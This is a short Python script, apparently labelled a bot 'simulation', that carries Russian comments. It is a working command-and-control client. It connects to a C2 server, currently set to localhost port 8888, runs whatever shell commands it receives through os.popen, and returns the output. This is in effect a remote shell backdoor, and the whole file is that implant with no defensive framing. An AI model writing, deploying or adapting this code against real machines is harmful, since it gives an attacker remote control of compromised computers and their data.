# bot_simulation.py
import os
import socket
import json

C2_SERVER = '127.0.0.1'
C2_PORT = 8888

def connect_to_c2():
    with socket.socket() as s:
        s.connect((C2_SERVER, C2_PORT))
        print("Подключён к командному серверу")
        while True:
            command = s.recv(1024).decode()
            if not command:
                break
            # Выполняем команду
            result = os.popen(command).read()
            response = json.dumps({"result": result})
            s.send(response.encode())

connect_to_c2()